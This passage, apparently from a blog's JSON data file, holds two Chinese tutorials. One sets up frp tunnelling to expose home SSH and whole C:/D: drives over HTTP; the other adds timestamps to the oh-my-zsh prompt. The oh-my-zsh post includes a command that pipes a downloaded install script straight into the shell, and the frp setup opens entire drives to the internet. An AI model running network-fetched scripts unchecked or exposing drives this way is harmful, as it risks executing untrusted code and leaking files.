class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[common]</span><br><span class=\"line\">server_addr = x.x.x.x</span><br><span class=\"line\">server_port = 7000</span><br><span class=\"line\"></span><br><span class=\"line\">[ssh]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = tcp</span><br><span class=\"line\">local_ip = 127.0.0.1</span><br><span class=\"line\">local_port = 22</span><br><span class=\"line\">remote_port = 6000</span><br><span class=\"line\"></span><br><span class=\"line\">[c_static_file]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = tcp</span><br><span class=\"line\">remote_port = 6001</span><br><span class=\"line\">plugin = static_file</span><br><span class=\"line\">plugin_local_path = C:</span><br><span class=\"line\">plugin_strip_prefix = driver_c</span><br><span class=\"line\">plugin_http_user = 自定义名称，这个和系统登录的用户名不是一个东西，随便写就行</span><br><span class=\"line\">plugin_http_passwd = 自定义密码</span><br><span class=\"line\"></span><br><span class=\"line\">[d_static_file]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = tcp</span><br><span class=\"line\">remote_port = 6002</span><br><span class=\"line\">plugin = static_file</span><br><span class=\"line\">plugin_local_path = D:</span><br><span class=\"line\">plugin_strip_prefix = driver_d</span><br><span class=\"line\">plugin_http_user = 自定义名称，同上</span><br><span class=\"line\">plugin_http_passwd = 自定义密码</span><br></pre></td></tr></table></figure>\n\n<p>我们在上文已配置好ssh的基础上，追加两个文件访问配置c_static_file和d_static_file，这两个标签名字也是自定义的；static_file是文件访问服务的客户端插件名称，这个是固定的；<code>plugin_local_path = C:</code>表示可访问整个C盘，对应下面的是D盘；driver_c和driver_d这两个前缀也是自定义的，便于等会儿在浏览器访问。</p>\n<p>修改配置文件后，重新启动客户端frp：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure>\n\n<p>启动成功后，就可以在浏览器直接访问啦：<strong><a href=\"http://x.x.x.x:6001/driver_c/\">http://x.x.x.x:6001/driver_c/</a></strong> ，访问的时候提示你输入用户名和密码就是上面配置的plugin_http_user和passwd。</p>\n<p><em>（不容易注意到的小坑：地址末尾的斜杠&#x2F;必须填，否则访问不了）</em></p>\n<h3 id=\"末了\"><a href=\"#末了\" class=\"headerlink\" title=\"末了\"></a>末了</h3><p>在测试的时候，我的公网服务器是在腾讯云上，默认有防火墙规则，所以要记得在后台配置放开相应的端口访问（比如上述的7000和6000）。另外，文中有个小彩蛋，不知道有没有人发现哈哈！</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover_type":"img","excerpt":"","more":"<h3 id=\"场景\"><a href=\"#场景\" class=\"headerlink\" title=\"场景\"></a>场景</h3><p>为了避免阐述过多理论，我们直接从需求场景入手，来了解一下为什么需要内网穿透？</p>\n<blockquote>\n<p>小明是少数派的一位咕咕作者，在家里电脑稿某文稿了一半，到公司后打算摸鱼继续稿，怎么办呢（此处假定他没有使用任何云同步软件，也不会使用git，就算会用他也忘了提交）？</p>\n<p>此时，小明想通过ssh等远程访问设备文件的方式来下载家里那半稿子，但他的家庭网络是没有分配公网IP的，无法通过互联网直连。内网穿透就这样派上用场了。</p>\n</blockquote>\n<p>所以通俗地讲，内网穿透就是要将流量从公网穿透到内网，让内网设备也能通过公网访问，帮助小明在公司访问家里电脑的文件。</p>\n<h3 id=\"设施\"><a href=\"#设施\" class=\"headerlink\" title=\"设施\"></a>设施</h3><p>内网穿透的核心思想就是“映射”和“转发”，把内网设备的端口映射到公网设备的端口上，来进行流量转发。</p>\n<p><img src=\"https://cdn.sspai.com/2022/05/17/db42d70e69013af8c4944a5fc1225e3b.png\" alt=\"image-20220517161146780\"></p>\n<p>简单地画一下示意图如上，基础设施由两个核心设备组成：</p>\n<p>服务端：拥有公网IP的设备一台，即上图“公网服务器”，开放2个端口7000和6000，用于公网通信。</p>\n<p>客户端：要访问的内网设备一台，即上图”内网家用电脑”，开放实际应用服务所需的端口（比如ssh服务，默认22端口），并将配置的公网映射端口6000告知服务端。所以服务端开放的那个端口6000实际上是客户端告诉它的。</p>\n<p><em>（以上端口除22以外均为自定义端口，无特殊含义。）</em></p>\n<p>基础设施搭建好以后，小明在公司通过ssh远程访问自家电脑的命令便如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 假定服务器公网IP是119.23.141.248，内网家用电脑用户名是test</span></span><br><span class=\"line\">ssh -oPort=6000 <span class=\"built_in\">test</span>@119.23.141.248</span><br></pre></td></tr></table></figure>\n\n<p>这就是我们想达到内网穿透的预期效果——表面上看，家庭内网的电脑就像拥有了公网IP一样暴露在互联网中。</p>\n<h3 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h3><p>要实现这种基础的内网穿透，一般是以一台带公网IP的服务器作为中转（暂不讨论点对点的）。开源世界中已经有很多较为成熟的工具，接下来就直接以<a href=\"https://github.com/fatedier/frp\">frp</a>为例，简单几步部署就可以搞定啦！</p>\n<h4 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h4><p>先在官方发布仓库下载对应包，几种常用架构：</p>\n<ul>\n<li>比如服务端一般是Linux（Intel 64位CPU）：<a href=\"https://github.com/fatedier/frp/releases/download/v0.42.0/frp_0.42.0_linux_amd64.tar.gz\">frp_0.42.0_linux_amd64.tar.gz</a></li>\n<li>客户端一般是Windows（Intel 64位CPU）：<a href=\"https://github.com/fatedier/frp/releases/download/v0.42.0/frp_0.42.0_windows_amd64.zip\">frp_0.42.0_windows_amd64.zip</a></li>\n<li>或macOS（Intel芯片）：<a href=\"https://github.com/fatedier/frp/releases/download/v0.42.0/frp_0.42.0_darwin_amd64.tar.gz\">frp_0.42.0_darwin_amd64.tar.gz</a>；M1芯片：<a href=\"https://github.com/fatedier/frp/releases/download/v0.42.0/frp_0.42.0_darwin_arm64.tar.gz\">frp_0.42.0_darwin_arm64.tar.gz</a></li>\n</ul>\n<p>如果GitHub访问困难，可以从我的网盘下载：<a href=\"https://pan.baidu.com/s/1BUb9pDITZLPHATGYaYVefw?pwd=c655\">frp-v0.4.2</a></p>\n<p><strong>解压</strong>后会发现里面既有<code>frps</code>也有<code>frpc</code>（Windows版本的可执行程序是exe），前者表示Server（服务端），后者表示Client（客户端），对应同名配置文件<code>frps.ini</code>和<code>frpc.ini</code>，对于某一端只会用到其中一套程序。</p>\n<h4 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h4><p>这里参考<a href=\"https://gofrp.org/docs/examples/ssh/\">官方文档</a>介绍两种比较实用的配置，ssh服务和文件访问服务。</p>\n<p><strong>一、通过 SSH 访问内网机器</strong></p>\n<p>解压对应架构的包到服务端，并修改frps.ini文件，设置端口7000，当然你可以自定义为任意端口，只要不和系统上已有端口冲突即可：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[common]</span><br><span class=\"line\">bind_port = 7000</span><br></pre></td></tr></table></figure>\n\n<p>启动服务端frp（-c参数表示config）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure>\n\n<p>同理，解压包到客户端，并修改frpc.ini文件，在common标签下填入公网服务器的IP和端口（对应服务端设置的端口）。然后设置好ssh服务的远程端口6000即可（local_ip和port一般不用改）。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[common]</span><br><span class=\"line\">server_addr = x.x.x.x</span><br><span class=\"line\">server_port = 7000</span><br><span class=\"line\"></span><br><span class=\"line\">[ssh]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = tcp</span><br><span class=\"line\">local_ip = 127.0.0.1</span><br><span class=\"line\">local_port = 22</span><br><span class=\"line\">remote_port = 6000</span><br></pre></td></tr></table></figure>\n\n<p>启动客户端frp：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure>\n\n<p>不出意外的话，客户端的终端会提示你登录服务端成功。</p>\n<p>然后在任意一个设备上即可通过公网访问内网设备（即客户端frp所在的那台）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -oPort=6000 你的系统登录用户名@x.x.x.x</span><br></pre></td></tr></table></figure>\n\n<p><strong>二、对外提供简单的文件访问服务</strong></p>\n<p>如果我们想通过浏览器直接访问内网设备上的文件，就这样配置客户端（此处以Windows为例），不用改服务端：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[common]</span><br><span class=\"line\">server_addr = x.x.x.x</span><br><span class=\"line\">server_port = 7000</span><br><span class=\"line\"></span><br><span class=\"line\">[ssh]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = tcp</span><br><span class=\"line\">local_ip = 127.0.0.1</span><br><span class=\"line\">local_port = 22</span><br><span class=\"line\">remote_port = 6000</span><br><span class=\"line\"></span><br><span class=\"line\">[c_static_file]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = tcp</span><br><span class=\"line\">remote_port = 6001</span><br><span class=\"line\">plugin = static_file</span><br><span class=\"line\">plugin_local_path = C:</span><br><span class=\"line\">plugin_strip_prefix = driver_c</span><br><span class=\"line\">plugin_http_user = 自定义名称，这个和系统登录的用户名不是一个东西，随便写就行</span><br><span class=\"line\">plugin_http_passwd = 自定义密码</span><br><span class=\"line\"></span><br><span class=\"line\">[d_static_file]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = tcp</span><br><span class=\"line\">remote_port = 6002</span><br><span class=\"line\">plugin = static_file</span><br><span class=\"line\">plugin_local_path = D:</span><br><span class=\"line\">plugin_strip_prefix = driver_d</span><br><span class=\"line\">plugin_http_user = 自定义名称，同上</span><br><span class=\"line\">plugin_http_passwd = 自定义密码</span><br></pre></td></tr></table></figure>\n\n<p>我们在上文已配置好ssh的基础上，追加两个文件访问配置c_static_file和d_static_file，这两个标签名字也是自定义的；static_file是文件访问服务的客户端插件名称，这个是固定的；<code>plugin_local_path = C:</code>表示可访问整个C盘，对应下面的是D盘；driver_c和driver_d这两个前缀也是自定义的，便于等会儿在浏览器访问。</p>\n<p>修改配置文件后，重新启动客户端frp：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure>\n\n<p>启动成功后，就可以在浏览器直接访问啦：<strong><a href=\"http://x.x.x.x:6001/driver_c/\">http://x.x.x.x:6001/driver_c/</a></strong> ，访问的时候提示你输入用户名和密码就是上面配置的plugin_http_user和passwd。</p>\n<p><em>（不容易注意到的小坑：地址末尾的斜杠&#x2F;必须填，否则访问不了）</em></p>\n<h3 id=\"末了\"><a href=\"#末了\" class=\"headerlink\" title=\"末了\"></a>末了</h3><p>在测试的时候，我的公网服务器是在腾讯云上，默认有防火墙规则，所以要记得在后台配置放开相应的端口访问（比如上述的7000和6000）。另外，文中有个小彩蛋，不知道有没有人发现哈哈！</p>\n"},{"layout":"post","title":"让终端命令更有时间观念","subtitle":"摸鱼吗？","date":"2022-10-29T16:00:00.000Z","author":"YSY","header-img":"img/404-bg.jpg","catalog":true,"_content":"\n### 背景\n\n我们无论是在Mac还是Linux平台上工作，都避免不了要使用终端来执行命令。然而系统默认的终端功能非常简单，没有命令建议、自动补全等功能，对强依赖终端的工作者来说很不友好。\n\n还好有[oh-my-zsh](https://ohmyz.sh/#install)，它对zsh进行了增强，不仅有丰富的插件，还可以自定义主题配置。了解或使用过它的同学一定会觉得非常香。这里引用一篇少数派作者之前的文章，我就不赘述它的好处了：[Oh My Zsh 配置指南](https://sspai.com/post/55176)\n\n### 使用\n\n安装和使用都非常简单，在安装了zsh的前提下，一行命令即可搞定：\n\n```bash\nsh -c \"$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"\n# 或者\nsh -c \"$(wget https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh -O -)\"\n```\n\n**特别提醒：** 如果访问不了GitHub的话，可以使用国内镜像备份仓库：\n\n```bash\ngit clone https://gitee.com/mirrors/oh-my-zsh.git\nbash .oh-my-zsh/tools/install.sh\n```\n\n### 自定义\n\n即便oh-my-zsh已经如此强大，还是有不满足需求的地方。\n\n比如日常工作中，我们有时候会重复执行许多相同命令，但来回切换桌面后就忘了上一次执行是什么时候了，因为终端命令默认不显示时间戳的。\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/67e8097215e14931bcb485fd3dd0f957.png#pic_center)\n\n如上图，以我开发移动应用为例，每次编译成功后习惯用adb命令安装apk到手机，没有时间戳提醒，我就会忘记上一次安装是什么时候了，不确定是不是最新编译的。\n\n所以我想如果是这样的效果就好多了：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/427bebc156d3498abf53a7b80dc9ebd6.png#pic_center)\n\n\n每次执行任何命令都会留下时间，就非常棒了。好在oh-my-zsh可以自定义主题配置文件，最终可以达到这样的效果。\n\n首先编辑当前的配置文件：\n\n```bash\nvim ~/.oh-my-zsh/themes/$ZSH_THEME.zsh-theme\n# 没有vim可以用open -e\n```\n\n打开后，内容如下，可以看见默认已经配置了一些插件，比如识别git分支信息：\n\n```\nPROMPT=\"%(?:%{$fg_bold[green]%}➜ :%{$fg_bold[red]%}➜ )\"\nPROMPT+=' %{$fg[cyan]%}%c%{$reset_color%} $(git_prompt_info)'\n\nZSH_THEME_GIT_PROMPT_PREFIX=\"%{$fg_bold[blue]%}git:(%{$fg[red]%}\"\nZSH_THEME_GIT_PROMPT_SUFFIX=\"%{$reset_color%} \"\nZSH_THEME_GIT_PROMPT_DIRTY=\"%{$fg[blue]%}) %{$fg[yellow]%}✗\"\nZSH_THEME_GIT_PROMPT_CLEAN=\"%{$fg[blue]%})\"\n```\n\n这个就相当于你的命令前缀模板，要显示时间的话，达到和上图一样的效果，可在第二行添加：\n\n{% raw %}\n```\n……\nPROMPT+=\"%D{%H:%M:%S}\"\n……\n```\n{% endraw %}\n\n保存后重启终端，就OK了！\n\n如果想要12小时制，就把`H`改成`L`。如果还需要显示年月日的话，补充一下即可：\n\n{% raw %}\n```\nPROMPT+=\"%D{%y/%m/%f} %D{%H:%M:%S}\"\n```\n{% endraw %}\n","source":"_posts/2022-10-30-让终端命令更有时间观念.md","raw":"---\nlayout:     post\ntitle:      让终端命令更有时间观念\nsubtitle:   摸鱼吗？\ndate:       2022-10-30\nauthor:     YSY\nheader-img: img/404-bg.jpg\ncatalog: true\ntags:\n    - 鼓捣折腾\n---\n\n### 背景\n\n我们无论是在Mac还是Linux平台上工作，都避免不了要使用终端来执行命令。然而系统默认的终端功能非常简单，没有命令建议、自动补全等功能，对强依赖终端的工作者来说很不友好。\n\n还好有[oh-my-zsh](https://ohmyz.sh/#install)，它对zsh进行了增强，不仅有丰富的插件，还可以自定义主题配置。了解或使用过它的同学一定会觉得非常香。这里引用一篇少数派作者之前的文章，我就不赘述它的好处了：[Oh My Zsh 配置指南](https://sspai.com/post/55176)\n\n### 使用\n\n安装和使用都非常简单，在安装了zsh的前提下，一行命令即可搞定：\n\n```bash\nsh -c \"$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"\n# 或者\nsh -c \"$(wget https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh -O -)\"\n```\n\n**特别提醒：** 如果访问不了GitHub的话，可以使用国内镜像备份仓库：\n\n```bash\ngit clone https://gitee.com/mirrors/oh-my-zsh.git\nbash .oh-my-zsh/tools/install.sh\n```\n\n### 自定义\n\n即便oh-my-zsh已经如此强大，还是有不满足需求的地方。\n\n比如日常工作中，我们有时候会重复执行许多相同命令，但来回切换桌面后就忘了上一次执行是什么时候了，因为终端命令默认不显示时间戳的。\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/67e8097215e14931bcb485fd3dd0f957.png#pic_center)\n\n如上图，以我开发移动应用为例，每次编译成功后习惯用adb命令安装apk到手机，没有时间戳提醒，我就会忘记上一次安装是什么时候了，不确定是不是最新编译的。\n\n所以我想如果是这样的效果就好多了：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/427bebc156d3498abf53a7b80dc9ebd6.png#pic_center)\n\n\n每次执行任何命令都会留下时间，就非常棒了。好在oh-my-zsh可以自定义主题配置文件，最终可以达到这样的效果。\n\n首先编辑当前的配置文件：\n\n```bash\nvim ~/.oh-my-zsh/themes/$ZSH_THEME.zsh-theme\n# 没有vim可以用open -e\n```\n\n打开后，内容如下，可以看见默认已经配置了一些插件，比如识别git分支信息：\n\n```\nPROMPT=\"%(?:%{$fg_bold[green]%}➜ :%{$fg_bold[red]%}➜ )\"\nPROMPT+=' %{$fg[cyan]%}%c%{$reset_color%} $(git_prompt_info)'\n\nZSH_THEME_GIT_PROMPT_PREFIX=\"%{$fg_bold[blue]%}git:(%{$fg[red]%}\"\nZSH_THEME_GIT_PROMPT_SUFFIX=\"%{$reset_color%} \"\nZSH_THEME_GIT_PROMPT_DIRTY=\"%{$fg[blue]%}) %{$fg[yellow]%}✗\"\nZSH_THEME_GIT_PROMPT_CLEAN=\"%{$fg[blue]%})\"\n```\n\n这个就相当于你的命令前缀模板，要显示时间的话，达到和上图一样的效果，可在第二行添加：\n\n{% raw %}\n```\n……\nPROMPT+=\"%D{%H:%M:%S}\"\n……\n```\n{% endraw %}\n\n保存后重启终端，就OK了！\n\n如果想要12小时制，就把`H`改成`L`。如果还需要显示年月日的话，补充一下即可：\n\n{% raw %}\n```\nPROMPT+=\"%D{%y/%m/%f} %D{%H:%M:%S}\"\n```\n{% endraw %}\n","slug":"让终端命令更有时间观念","published":1,"updated":"2024-03-25T07:31:25.989Z","comments":1,"photos":[],"link":"","_id":"cluaufh1m004ythe608dd406w","content":"<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>我们无论是在Mac还是Linux平台上工作，都避免不了要使用终端来执行命令。然而系统默认的终端功能非常简单，没有命令建议、自动补全等功能，对强依赖终端的工作者来说很不友好。</p>\n<p>还好有<a href=\"https://ohmyz.sh/#install\">oh-my-zsh</a>，它对zsh进行了增强，不仅有丰富的插件，还可以自定义主题配置。了解或使用过它的同学一定会觉得非常香。这里引用一篇少数派作者之前的文章，我就不赘述它的好处了：<a href=\"https://sspai.com/post/55176\">Oh My Zsh 配置指南</a></p>\n<h3 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h3><p>安装和使用都非常简单，在安装了zsh的前提下，一行命令即可搞定：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sh -c <span class=\"string\">&quot;<span class=\"subst\">$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># 或者</span></span><br><span class=\"line\">sh -c <span class=\"string\">&quot;<span class=\"subst\">$(wget https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh -O -)</span>&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>特别提醒：</strong> 如果访问不了GitHub的话，可以使用国内镜像备份仓库：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://gitee.com/mirrors/oh-my-zsh.git</span><br><span class=\"line\">bash .oh-my-zsh/tools/install.sh</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"自定义\"><a href=\"#自定义\" class=\"headerlink\" title=\"自定义\"></a>自定义</h3><p>即便oh-my-zsh已经如此强大，还是有不满足需求的地方。</p>\n<p>比如日常工作中，我们有时候会重复执行许多相同命令，但来回切换桌面后就忘了上一次执行是什么时候了，因为终端命令默认不显示时间戳的。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/67e8097215e14931bcb485fd3dd0f957.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>如上图，以我开发移动应用为例，每次编译成功后习惯用adb命令安装apk到手机，没有时间戳提醒，我就会忘记上一次安装是什么时候了，不确定是不是最新编译的。</p>\n<p>所以我想如果是这样的效果就好多了：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/427bebc156d3498abf53a7b80dc9ebd6.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>每次执行任何命令都会留下时间，就非常棒了。好在oh-my-zsh可以自定义主题配置文件，最终可以达到这样的效果。</p>\n<p>首先编辑当前的配置文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim ~/.oh-my-zsh/themes/<span class=\"variable\">$ZSH_THEME</span>.zsh-theme</span><br><span class=\"line\"><span class=\"comment\"># 没有vim可以用open -e</span></span><br></pre></td></tr></table></figure>\n\n<p>打开后，内容如下，可以看见默认已经配置了一些插件，比如识别git分支信息：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PROMPT=&quot;%(?:%&#123;$fg_bold[green]%&#125;➜ :%&#123;$fg_bold[red]%&#125;➜ )&quot;</span><br><span class=\"line\">PROMPT+=&#x27; %&#123;$fg[cyan]%&#125;%c%&#123;$reset_color%&#125; $(git_prompt_info)&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">ZSH_THEME_GIT_PROMPT_PREFIX=&quot;%&#123;$fg_bold[blue]%&#125;git:(%&#123;$fg[red]%&#125;&quot;</span><br><span class=\"line\">ZSH_THEME_GIT_PROMPT_SUFFIX=&quot;%&#123;$reset_color%&#125; &quot;</span><br><span class=\"line\">ZSH_THEME_GIT_PROMPT_DIRTY=&quot;%&#123;$fg[blue]%&#125;) %&#123;$fg[yellow]%&#125;✗&quot;</span><br><span class=\"line\">ZSH_THEME_GIT_PROMPT_CLEAN=&quot;%&#123;$fg[blue]%&#125;)&quot;</span><br></pre></td></tr></table></figure>\n\n<p>这个就相当于你的命令前缀模板，要显示时间的话，达到和上图一样的效果，可在第二行添加：</p>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">……</span><br><span class=\"line\">PROMPT+=&quot;%D&#123;%H:%M:%S&#125;&quot;</span><br><span class=\"line\">……</span><br></pre></td></tr></table></figure>\n\n\n<p>保存后重启终端，就OK了！</p>\n<p>如果想要12小时制，就把<code>H</code>改成<code>L</code>。如果还需要显示年月日的话，补充一下即可：</p>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PROMPT+=&quot;%D&#123;%y/%m/%f&#125; %D&#123;%H:%M:%S&#125;&quot;</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>我们无论是在Mac还是Linux平台上工作，都避免不了要使用终端来执行命令。然而系统默认的终端功能非常简单，没有命令建议、自动补全等功能，对强依赖终端的工作者来说很不友好。</p>\n<p>还好有<a href=\"https://ohmyz.sh/#install\">oh-my-zsh</a>，它对zsh进行了增强，不仅有丰富的插件，还可以自定义主题配置。了解或使用过它的同学一定会觉得非常香。这里引用一篇少数派作者之前的文章，我就不赘述它的好处了：<a href=\"https://sspai.com/post/55176\">Oh My Zsh 配置指南</a></p>\n<h3 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h3><p>安装和使用都非常简单，在安装了zsh的前提下，一行命令即可搞定：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sh -c <span class=\"string\">&quot;<span class=\"subst\">$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># 或者</span></span><br><span class=\"line\">sh -c <span class=\"string\">&quot;<span class=\"subst\">$(wget https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh -O -)</span>&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>特别提醒：</strong> 如果访问不了GitHub的话，可以使用国内镜像备份仓库：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://gitee.com/mirrors/oh-my-zsh.git</span><br><span class=\"line\">bash .oh-my-zsh/tools/install.sh</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"自定义\"><a href=\"#自定义\" class=\"headerlink\" title=\"自定义\"></a>自定义</h3><p>即便oh-my-zsh已经如此强大，还是有不满足需求的地方。</p>\n<p>比如日常工作中，我们有时候会重复执行许多相同命令，但来回切换桌面后就忘了上一次执行是什么时候了，因为终端命令默认不显示时间戳的。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/67e8097215e14931bcb485fd3dd0f957.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>如上图，以我开发移动应用为例，每次编译成功后习惯用adb命令安装apk到手机，没有时间戳提醒，我就会忘记上一次安装是什么时候了，不确定是不是最新编译的。</p>\n<p>所以我想如果是这样的效果就好多了：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/427bebc156d3498abf53a7b80dc9ebd6.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>每次执行任何命令都会留下时间，就非常棒了。好在oh-my-zsh可以自定义主题配置文件，最终可以达到这样的效果。</p>\n<p>首先编辑当前的配置文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim ~/.oh-my-zsh/themes/<span class=\"variable\">$ZSH_THEME</span>.zsh-theme</span><br><span class=\"line\"><span class=\"comment\"># 没有vim可以用open 